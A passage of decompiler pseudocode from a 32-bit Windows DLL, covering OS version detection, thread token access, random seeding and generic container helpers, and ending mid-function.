// 100735D8: using guessed type int (__thiscall *off_100735D8)(void *Block, char);

//----- (1000F61F) --------------------------------------------------------
int *__thiscall sub_1000F61F(int *Block, char a2)
{
  sub_10014C9D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000F63E) --------------------------------------------------------
_DWORD *__thiscall sub_1000F63E(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess)
{
  int v4; // eax
  HANDLE pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  HANDLE TokenHandle; // [esp+20h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  v4 = this[1];
  TokenHandle = 0;
  if ( !OpenThreadToken(*(HANDLE *)(v4 + 16), DesiredAccess, a3 != 0, &TokenHandle) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_100268EB(a2, TokenHandle);
  return a2;
}

//----- (1000F6BC) --------------------------------------------------------
LONG __stdcall sub_1000F6BC(int *a1)
{
  LONG result; // eax

  result = (LONG)a1;
  if ( *a1 )
    return sub_1000BE8E(*a1);
  return result;
}

//----- (1000F6F0) --------------------------------------------------------
LONG __usercall sub_1000F6F0@<eax>(int *a1@<esi>)
{
  LONG result; // eax
  void *v2; // eax
  int v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x14u);
      if ( v2 )
        v3 = sub_10014BC2((int)v2, *a1);
      else
        v3 = 0;
      *a1 = v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}

//----- (1000F73F) --------------------------------------------------------
int sub_1000F73F()
{
  sub_1000FAE0();
  return dword_1008F660;
}
// 1008F660: using guessed type int dword_1008F660;

//----- (1000F74A) --------------------------------------------------------
int sub_1000F74A()
{
  sub_1000FAE0();
  return dword_1008F664;
}
// 1008F664: using guessed type int dword_1008F664;

//----- (1000F755) --------------------------------------------------------
int __thiscall sub_1000F755(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_1000FAE0();
  if ( !sub_1000F79B() )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return dword_1008F668;
}
// 1008F668: using guessed type int dword_1008F668;

//----- (1000F78F) --------------------------------------------------------
BOOL sub_1000F78F()
{
  return sub_1000F74A() == 1;
}

//----- (1000F79B) --------------------------------------------------------
BOOL sub_1000F79B()
{
  return sub_1000F78F() && sub_1000F73F() >= 6;
}

//----- (1000F8D3) --------------------------------------------------------
bool sub_1000F8D3()
{
  return sub_1000F73F() >= 9;
}

//----- (1000F8E3) --------------------------------------------------------
char __usercall sub_1000F8E3@<al>(_DWORD *a1@<esi>)
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-A0h] BYREF
  unsigned __int8 v3; // [esp+9Ah] [ebp-6h]

  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 156;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  *a1 = v3;
  return 1;
}

//----- (1000F92C) --------------------------------------------------------
char __usercall sub_1000F92C@<al>(int *a1@<edx>, _DWORD *a2@<ecx>, int *a3@<edi>)
{
  bool v6; // zf
  DWORD v7; // eax
  DWORD v8; // eax
  DWORD v9; // eax
  int v10; // esi
  int v11; // eax
  int v12; // esi
  int v13; // [esp+8h] [ebp-9Ch] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-98h] BYREF

  *a3 = 0;
  *a1 = 0;
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) )
    return 0;
  if ( VersionInformation.dwPlatformId == 1 )
  {
    v11 = 0;
    v6 = VersionInformation.dwMajorVersion == 4;
    *a2 = 0;
    if ( v6 )
    {
      switch ( VersionInformation.dwMinorVersion )
      {
        case 0u:
          *a3 = 1;
          return 1;
        case 0xAu:
          *a3 = 2;
          return 1;
        case 0x5Au:
          *a3 = 3;
          return 1;
      }
    }
    goto LABEL_21;
  }
  if ( VersionInformation.dwPlatformId != 2 )
    return 0;
  v7 = VersionInformation.dwMajorVersion - 3;
  v6 = VersionInformation.dwMajorVersion == 3;
  *a2 = 1;
  if ( v6 )
  {
    *a3 = 4;
    return 1;
  }
  v8 = v7 - 1;
  if ( !v8 )
  {
    *a3 = 5;
    return 1;
  }
  v9 = v8 - 1;
  if ( !v9 )
  {
    if ( sub_1000F8E3(a1) )
    {
      switch ( VersionInformation.dwMinorVersion )
      {
        case 0u:
          *a3 = 6;
          return 1;
        case 1u:
          *a3 = 7;
          return 1;
        case 2u:
          *a3 = 8;
          return 1;
      }
      goto LABEL_9;
    }
    return 0;
  }
  if ( v9 == 1 )
  {
    v13 = 0;
    if ( sub_1000FB3C(&v13) )
    {
      if ( v13 == 1 )
      {
        *a3 = 11;
        return 1;
      }
      if ( v13 == 2 )
      {
        *a3 = 0;
        return 1;
      }
      if ( sub_1000F8E3(a1) )
      {
        if ( VersionInformation.dwMinorVersion )
        {
          if ( VersionInformation.dwMinorVersion != 1 )
            goto LABEL_9;
          v10 = *a1;
          if ( v10 == 1 )
          {
            *a3 = 13;
            return 1;
          }
          v11 = (unsigned int)(v10 - 2) > 1 ? 0 : 12;
        }
        else
        {
          v12 = *a1;
          if ( v12 == 1 )
          {
            *a3 = 9;
            return 1;
          }
          v11 = (unsigned int)(v12 - 2) > 1 ? 0 : 10;
        }
LABEL_21:
        *a3 = v11;
        return 1;
      }
    }
    return 0;
  }
LABEL_9:
  *a3 = 0;
  return 1;
}

//----- (1000FAE0) --------------------------------------------------------
void sub_1000FAE0()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-18h] BYREF
  int v1; // [esp+Ch] [ebp-Ch] BYREF
  int v2; // [esp+10h] [ebp-8h] BYREF
  int v3; // [esp+14h] [ebp-4h] BYREF

  if ( byte_1008EA63 )
  {
    if ( !sub_1000F92C(&v1, &v2, &v3) )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    dword_1008F660 = v3;
    dword_1008F664 = v2;
    dword_1008F668 = v1;
    byte_1008EA63 = 0;
  }
}
// 1008EA63: using guessed type char byte_1008EA63;
// 1008F660: using guessed type int dword_1008F660;
// 1008F664: using guessed type int dword_1008F664;
// 1008F668: using guessed type int dword_1008F668;
// 1000FAE0: using guessed type _DWORD pExceptionObject[3];

//----- (1000FB3C) --------------------------------------------------------
char __usercall sub_1000FB3C@<al>(_DWORD *a1@<ebx>)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetProductInfo)(DWORD, DWORD, DWORD, DWORD, PDWORD); // eax
  int v4; // eax
  int v5; // [esp+0h] [ebp-A4h] BYREF
  _BYTE VersionInformation[156]; // [esp+4h] [ebp-A0h] BYREF

  v5 = 0;
  *a1 = 0;
  memset(VersionInformation, 0, sizeof(VersionInformation));
  *(_DWORD *)VersionInformation = 156;
  if ( !GetVersionExA((LPOSVERSIONINFOA)VersionInformation) )
    return 0;
  ModuleHandleW = GetModuleHandleW(ModuleName);
  if ( !ModuleHandleW )
    return 0;
  GetProductInfo = (BOOL (__stdcall *)(DWORD, DWORD, DWORD, DWORD, PDWORD))GetProcAddress(ModuleHandleW, ProcName);
  if ( !GetProductInfo
    || !GetProductInfo(
          *(_DWORD *)&VersionInformation[4],
          *(_DWORD *)&VersionInformation[8],
          *(unsigned __int16 *)&VersionInformation[148],
          *(unsigned __int16 *)&VersionInformation[150],
          (PDWORD)&v5) )
  {
    return 0;
  }
  v4 = v5;
  if ( v5 == -1412584499 || !v5 )
    *a1 = 2;
  if ( v4 == 12 || v4 == 14 || v4 == 13 || v4 == 39 || v4 == 41 || v4 == 40 || v4 == 29 )
    *a1 = 1;
  return 1;
}

//----- (1000FC57) --------------------------------------------------------
void sub_1000FC57()
{
  __time32_t v0; // esi
  DWORD CurrentThreadId; // eax

  v0 = time(0);
  CurrentThreadId = GetCurrentThreadId();
  srand(v0 + CurrentThreadId);
}

//----- (1000FC7D) --------------------------------------------------------
void __stdcall sub_1000FC7D(int *a1)
{
  *a1 = (int)&off_10073694;
  sub_10009F65(a1 + 7);
  sub_10009F65(a1 + 4);
  sub_10009F65(a1 + 2);
  *a1 = (int)&off_10072BE8;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);
// 10073694: using guessed type int (__thiscall *off_10073694)(void *Block, char);

//----- (1000FCCB) --------------------------------------------------------
int *__thiscall sub_1000FCCB(int *Block, char a2)
{
  sub_1000FC7D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000FCEB) --------------------------------------------------------
void __stdcall sub_1000FCEB(int *a1)
{
  sub_100103C7(a1 + 9);
  sub_10012D7D(a1);
}

//----- (1000FD19) --------------------------------------------------------
int __stdcall sub_1000FD19(int a1)
{
  sub_10012CF1(a1);
  sub_10010390((_DWORD *)(a1 + 36));
  return a1;
}

//----- (1000FD49) --------------------------------------------------------
char sub_1000FD49()
{
  unsigned int v0; // esi
  char v2; // bl
  DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  char v6; // [esp+17h] [ebp-95h] BYREF
  int v7[3]; // [esp+18h] [ebp-94h] BYREF
  int v8; // [esp+24h] [ebp-88h] BYREF
  unsigned int v9; // [esp+28h] [ebp-84h]
  int v10[6]; // [esp+34h] [ebp-78h] BYREF
  int v11[10]; // [esp+4Ch] [ebp-60h] BYREF
  int v12[11]; // [esp+74h] [ebp-38h] BYREF
  int v13; // [esp+A8h] [ebp-4h]

  sub_100115F1(&v8);
  v0 = 0;
  v13 = 0;
  if ( sub_1000FF9F((int)&v8) )
  {
    sub_10009D2C(v7, &word_1008F654);
    LOBYTE(v13) = 1;
    sub_10029A76((int)v12, (int)&unk_1009553C, (int)v7);
    LOBYTE(v13) = 3;
    sub_10009F65(v7);
    sub_10009D2C(v7, &word_1008F658);
    LOBYTE(v13) = 4;
    sub_10029A76((int)v11, (int)&unk_10095534, (int)v7);
    LOBYTE(v13) = 6;
    sub_10009F65(v7);
    if ( sub_10029B8C(v12) || sub_10029B8C(v11) )
    {
      sub_10011A18((__int32)&v6, (int)&v6);
      if ( v9 )
      {
        do
        {
          v3 = (DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v8 + 44))(&v8, v0);
          v4 = sub_1001EE7C(*v3, v7, 0x400u);
          LOBYTE(v13) = 7;
          v5 = sub_10028524((int)v4, v10);
          LOBYTE(v13) = 8;
          sub_10029762((int)v5, (int *)dword_10091DBC);
          LOBYTE(v13) = 7;
          sub_10028590(v10);
          LOBYTE(v13) = 6;
          sub_10009696(v7);
          ++v0;
        }
        while ( v0 < v9 );
      }
      v2 = 1;
    }
    else
    {
      v2 = 0;
    }
    LOBYTE(v13) = 3;
    sub_1000FC7D(v11);
    LOBYTE(v13) = 0;
    sub_1000FC7D(v12);
    v13 = -1;
    sub_10011668((int)&v8);
    return v2;
  }
  else
  {
    v13 = -1;
    sub_10011668((int)&v8);
    return 0;
  }
}
// 10091DBC: using guessed type int dword_10091DBC;
// 1000FD49: using guessed type int var_38[11];
// 1000FD49: using guessed type int var_60[10];
// 1000FD49: using guessed type int var_78[6];

//----- (1000FF1B) --------------------------------------------------------
bool sub_1000FF1B()
{
  bool v0; // bl
  int v2[10]; // [esp+10h] [ebp-4Ch] BYREF
  _DWORD v3[4]; // [esp+38h] [ebp-24h] BYREF
  int v4[4]; // [esp+48h] [ebp-14h] BYREF
  int v5; // [esp+58h] [ebp-4h]

  sub_100115F1(v3);
  v5 = 0;
  if ( sub_1000FF9F((int)v3) )
  {
    sub_10009D2C(v4, &word_1008F65C);
    LOBYTE(v5) = 1;
    sub_10029A76((int)v2, (int)&unk_1009553C, (int)v4);
    LOBYTE(v5) = 3;
    sub_10009F65(v4);
    v0 = sub_10029B8C(v2);
    LOBYTE(v5) = 0;
    sub_1000FC7D(v2);
  }
  else
  {
    v0 = 0;
  }
  v5 = -1;
  sub_10011668((int)v3);
  return v0;
}
// 1000FF1B: using guessed type _DWORD var_24[4];
// 1000FF1B: using guessed type int var_4C[10];

//----- (1000FF9F) --------------------------------------------------------
bool __usercall sub_1000FF9F@<al>(int a1@<edi>)
{
  int v1; // eax
  void *v2; // ecx
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  int v7; // ecx
  int v9[4]; // [esp+10h] [ebp-40h] BYREF
  int v10[4]; // [esp+20h] [ebp-30h] BYREF
  int v11[2]; // [esp+30h] [ebp-20h] BYREF
  int v12[2]; // [esp+38h] [ebp-18h] BYREF
  int v13[3]; // [esp+40h] [ebp-10h] BYREF
  int v14; // [esp+4Ch] [ebp-4h]

  v1 = sub_1000F73F();
  if ( v1 != 6 && v1 != 7 )
    return 0;
  v3 = sub_1000F755(v2);
  if ( v3 == 3 || v3 == 2 )
    return 0;
  sub_100152F9(v9);
  v14 = 0;
  (*(void (__thiscall **)(int *, int *))(v9[0] + 8))(v9, v12);
  LOBYTE(v14) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v12[0] + 4))(v12[0]) )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v12[0] + 12))(v12[0]);
    sub_10010099(v10, v4);
    LOBYTE(v14) = 2;
    v5 = sub_100281A2((int)v10, v11);
    LOBYTE(v14) = 3;
    v6 = sub_1000A959((int)v5, (int)&unk_1009552C);
    LOBYTE(v14) = 2;
    sub_10009F65(v11);
    if ( v6 )
    {
      v13[0] = v10[0];
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 36))(a1, v13);
    }
    sub_100100F8(v7, v12[0]);
    LOBYTE(v14) = 1;
    sub_100100D0((int)v10);
  }
  LOBYTE(v14) = 0;
  sub_10011A2D(v12);
  v14 = -1;
  sub_10015325(v9);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) != 0;
}
// 1000FFBE: variable 'v2' is possibly undefined
// 1001004C: variable 'v7' is possibly undefined
// 1000FF9F: using guessed type int var_10[3];

//----- (10010099) --------------------------------------------------------
_DWORD *__stdcall sub_10010099(_DWORD *a1, _DWORD *a2)
{
  *a1 = *a2;
  a1[1] = a2[1];
  sub_10009F32(a1 + 2, (int)(a2 + 2));
  return a1;
}

//----- (100100D0) --------------------------------------------------------
void __stdcall sub_100100D0(int a1)
{
  sub_10009F65((int *)(a1 + 8));
}

//----- (100100F8) --------------------------------------------------------
int __usercall sub_100100F8@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10010129) --------------------------------------------------------
void __thiscall sub_10010129(_DWORD *this)
{
  *this = &off_10073740;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073740: using guessed type int (__thiscall *off_10073740)(void *Block, char);

//----- (1001014E) --------------------------------------------------------
int *__thiscall sub_1001014E(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10010C0B(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100101A4: variable 'v5' is possibly undefined

//----- (100101B6) --------------------------------------------------------
int *__thiscall sub_100101B6(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10010C4F(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001020C: variable 'v5' is possibly undefined

//----- (1001021E) --------------------------------------------------------
void __thiscall sub_1001021E(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10011AB1(v2);
}

//----- (10010256) --------------------------------------------------------
void __thiscall sub_10010256(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10011AB1(v3);
}

//----- (10010291) --------------------------------------------------------
void __thiscall sub_10010291(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10011AB1(v2);
}

//----- (100102C9) --------------------------------------------------------
int __thiscall sub_100102C9(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011B35(v4);
  return v2;
}

//----- (10010305) --------------------------------------------------------
int __thiscall sub_10010305(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011AB1(v4);
  return v2;
}

//----- (10010341) --------------------------------------------------------
void __thiscall sub_10010341(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10011AB1(v1);
}

//----- (10010390) --------------------------------------------------------
_DWORD *__stdcall sub_10010390(_DWORD *a1)
{
  sub_10010BDB(a1);
  *a1 = &off_100737B8;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 100737B8: using guessed type int (__thiscall *off_100737B8)(void *Block, char);

//----- (100103C7) --------------------------------------------------------
void __thiscall sub_100103C7(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi

  *this = &off_100737B8;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[6];
    sub_10010B06(i);
  }
  sub_10010129(this);
}
// 100737B8: using guessed type int (__thiscall *off_100737B8)(void *Block, char);

//----- (1001041E) --------------------------------------------------------
void *__thiscall sub_1001041E(void *this, int a2)
{
  sub_10010C80(a2, (int)this);
  return this;
}

//----- (10010433) --------------------------------------------------------
void *__thiscall sub_10010433(void *this, int a2)
{
  sub_10010C80(a2, (int)this);
  return this;
}

//----- (10010448) --------------------------------------------------------
int __thiscall sub_10010448(_DWORD *this)
{
  return this[3];
}

//----- (1001044C) --------------------------------------------------------
_DWORD *__thiscall sub_1001044C(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10010D56(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10011A72(a2, (int)v4);
  return a2;
}

//----- (100104A2) --------------------------------------------------------
_DWORD *__thiscall sub_100104A2(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10010F40(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10011AF6(a2, (int)v4);
  return a2;
}

//----- (100104F8) --------------------------------------------------------
_DWORD *__thiscall sub_100104F8(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10010D56(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10011A72(a2, (int)v4);
  return a2;
}

//----- (1001054E) --------------------------------------------------------
_DWORD *__thiscall sub_1001054E(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10010F40(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10011AF6(a2, (int)v4);
  return a2;
}

//----- (100105A4) --------------------------------------------------------
_DWORD *__thiscall sub_100105A4(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001112A(this, v3, 0);
  else
    v4 = 0;
  sub_10011B7A(a2, (int)v4);
  return a2;
}

//----- (100105F7) --------------------------------------------------------
_DWORD *__thiscall sub_100105F7(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10011294(this, v3, 0);
  else
    v4 = 0;
  sub_10011BFE(a2, (int)v4);
  return a2;
}

//----- (1001064A) --------------------------------------------------------
_DWORD *__thiscall sub_1001064A(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1001112A(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10011B7A(a2, (int)v4);
  return a2;
}

//----- (100106A5) --------------------------------------------------------
_DWORD *__thiscall sub_100106A5(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10011294(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10011BFE(a2, (int)v4);
  return a2;
}

//----- (10010700) --------------------------------------------------------
_DWORD *__thiscall sub_10010700(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1001112A(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10011B7A(a2, (int)v6);
  return a2;
}

//----- (10010775) --------------------------------------------------------
_DWORD *__thiscall sub_10010775(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10011294(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10011BFE(a2, (int)v6);
  return a2;
}

//----- (100107EA) --------------------------------------------------------
void __thiscall sub_100107EA(_DWORD *this)
{
  *this = &off_100737F8;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 100737F8: using guessed type int (__thiscall *off_100737F8)(void *Block, char);

//----- (1001080F) --------------------------------------------------------
int *__thiscall sub_1001080F(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10010CE1(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10010865: variable 'v5' is possibly undefined

//----- (10010877) --------------------------------------------------------
int *__thiscall sub_10010877(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10010D25(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100108CD: variable 'v5' is possibly undefined

//----- (100108DF) --------------------------------------------------------
void __thiscall sub_100108DF(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10011BB9(v2);
}

//----- (10010917) --------------------------------------------------------
void __thiscall sub_10010917(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10011BB9(v3);
}

//----- (10010952) --------------------------------------------------------
void __thiscall sub_10010952(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10011BB9(v2);
}

//----- (1001098A) --------------------------------------------------------
int __thiscall sub_1001098A(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011C3D(v4);
  return v2;
}

//----- (100109C6) --------------------------------------------------------
int __thiscall sub_100109C6(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011BB9(v4);
  return v2;
}

//----- (10010A02) --------------------------------------------------------
void __thiscall sub_10010A02(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
